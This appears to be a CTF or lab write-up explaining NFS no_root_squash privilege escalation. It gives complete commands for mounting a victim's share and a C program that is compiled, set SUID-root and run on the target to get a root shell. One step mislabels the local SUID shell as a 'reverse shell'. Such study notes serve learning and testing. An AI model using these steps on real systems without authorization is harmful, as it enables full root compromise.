
# 📝 **NFS Privilege Escalation**

## ✔️ **What is this Vulnerability ( VERY Simple )**

NFS = Network File System (Linux network shared folders).

Normal behavior:

* If ROOT creates a file → it stays ROOT.
* If **you**, a normal user, create a file → it stays your user.

NFS has a security feature called **root_squash**:

* If a remote person acts as root → NFS downgrades them to `nfsnobody` to prevent abuse.

But if the server admin mistakenly sets:

```
no_root_squash
```

Then **remote root stays root**.

This means:

### **⚠️ If attacker can mount the share → attacker can create root-owned files remotely.**

So the attacker can:
✔ create a binary
✔ give it SUID-root
✔ push it into the share
✔ target machine executes it as **root**
→ attacker gets **full root shell**

This is a VERY COMMON CTF vulnerability.

---

# 🚀 **Full Exploit Walkthrough (Step-by-Step)**

We start from zero.

---

# ✔️ STEP 1 — Check NFS exports on victim

On target:

```bash
cat /etc/exports
```

You saw:

```
/home/backup  *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp          *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

The important part:

```
no_root_squash
```

⚠️ This makes the share vulnerable.

---

# ✔️ STEP 2 — Check available NFS shares from attacker

On Kali:

```bash
showmount -e <TARGET-IP>
```

Example:

```
showmount -e 10.49.150.119
```

Output:

```
/tmp
/home/backup
/home/ubuntu/sharedfolder
```

---

# ✔️ STEP 3 — Mount the vulnerable share

Use `/tmp` (easiest).

```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs 10.49.150.119:/tmp /mnt/nfs
```

Check:

```bash
ls -l /mnt/nfs
```

You should see contents of **victim’s /tmp**.

---

# ✔️ STEP 4 — Create a SUID-root reverse shell binary

We do this on attacker, **inside the NFS mount**, so the file appears on victim too.

Become root (optional but easier):

```bash
sudo -s
```

Go into the NFS folder:

```bash
cd /mnt/nfs
```

Create C file:

```bash
cat > nfs.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
```

---

# ✔️ STEP 5 — Compile the C file (STATIC compile to avoid GLIBC errors)

```bash
gcc -static nfs.c -o nfs
```

If static fails:

```bash
apt install musl-tools
musl-gcc nfs.c -o nfs
```

---

# ✔️ STEP 6 — Make binary SUID-root

```bash
chown root:root nfs
chmod 4755 nfs
```

Check:

```bash
ls -l nfs
```

Should show:

```
-rwsr-xr-x 1 root root nfs
```

---

# ✔️ STEP 7 — On target: run the uploaded root shell

Now go to victim machine:

```bash
cd /tmp
ls -l nfs
```

Now run it:

```bash
./nfs
```

Congratulations — you now have a **root shell**.

Check:

```bash
whoami
id
```

Output should be:

```
root
uid=0(root) gid=0(root)
```

---

# 🎉 **NFS PrivEsc SUCCESS**

You exploited a real misconfigured NFS share using:

✔ `no_root_squash`
✔ Static SUID-root binary
✔ NFS-mounted shared folder
✔ Target executing your malicious binary

---

# 📌 **Short Summary for Notes**

```
1. NFS export has no_root_squash → vulnerable  
2. Mount share on attacker:
   sudo mount -t nfs TARGET:/tmp /mnt/nfs
3. Create SUID-root C program
4. Compile static:
   gcc -static nfs.c -o nfs
5. Set SUID:
   chown root:root nfs
   chmod 4755 nfs
6. On victim:
   cd /tmp
   ./nfs
→ ROOT
```
